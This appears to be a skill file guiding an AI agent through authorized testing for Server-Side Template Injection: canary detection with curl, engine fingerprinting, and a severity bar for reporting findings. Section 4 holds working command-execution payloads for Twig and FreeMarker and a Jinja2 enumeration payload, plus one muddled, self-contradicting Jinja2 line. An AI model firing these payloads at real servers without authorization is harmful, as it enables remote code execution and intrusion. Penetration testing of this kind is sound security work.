---
name: ssti
description: Server-Side Template Injection — detect with arithmetic canaries, then engine-specific payloads
---

# Server-Side Template Injection (CWE-1336 / CWE-94)

## 1. Find template-rendering sinks

User input reflected into rendered pages/emails/PDFs: greeting/username
fields rendered server-side, mail templates, invoice/report generators,
 CMS themes. From the endpoint map: POST/PUT endpoints whose value later
appears in HTML you did NOT write (i.e., server generated around it).

## 2. Detect with arithmetic canaries (never start with output payloads)

Submit unique expressions and compare whether they evaluate:

```bash
for expr in '7*7' '${7*7}' '#{7*7}' '{{7*7}}' '<%= 7*7 %>' '{{7*'7'}}' '${{7*7}}' '#{7*7}'; do
  curl -s -X POST <target>/profile -d "{\"name\":\"CANARY-$expr\"}" -o /dev/null
done
curl -s <target>/profile | grep -o 'CANARY-[^<]*'
```

`CANARY-49` anywhere = evaluated = SSTI. Which syntax fired identifies the
engine family. Plain reflection (`{{7*7}}` echoed literally) is XSS, not
SSTI — reroute accordingly.

## 3. Confirm and fingerprint the engine

- `{{7*'7'}}` → `7777777` = Jinja2 (Python); `49` = Twig (PHP).
- `${7*7}` fired → FreeMarker/Velocity/Thymeleaf (Java) or Smarty (PHP).
- `<%= 7*7 %>` → ERB (Ruby).
- Error messages leak engine names — read them.

## 4. Minimal-impact proof (RCE-lite, non-destructive)

```bash
# Jinja2: read a harmless file or compute — do NOT exfiltrate real data
{{ ''.__class__.__mro__[1].__subclasses__() }}            # enumeration
{{ getuid() }}                                            # not jinja; skip
{{ 7*7 }}  # already proven; for file read use cycler/config objects if needed
# Twig: {{ ['id'] | map('system') }} or {{ _self.env.registerUndefinedFilterCallback("exec") }}
# FreeMarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

Validation bar: prove code/context execution with a benign marker —
`id`/`uname` output or a canary file in /tmp. Never run destructive or
network-attack commands.

## 5. Validation bar for report_finding

- Evidence: the canary request + the evaluated response (`CANARY-49`),
  plus the engine fingerprint and the benign-execution output.
- PoC: exact request body. Severity: SSTI = critical (it is RCE);
  downgrade only if sandboxed engines (e.g. strict Sandboxed Jinja) are
  proven — then report as high/medium with the sandbox noted.
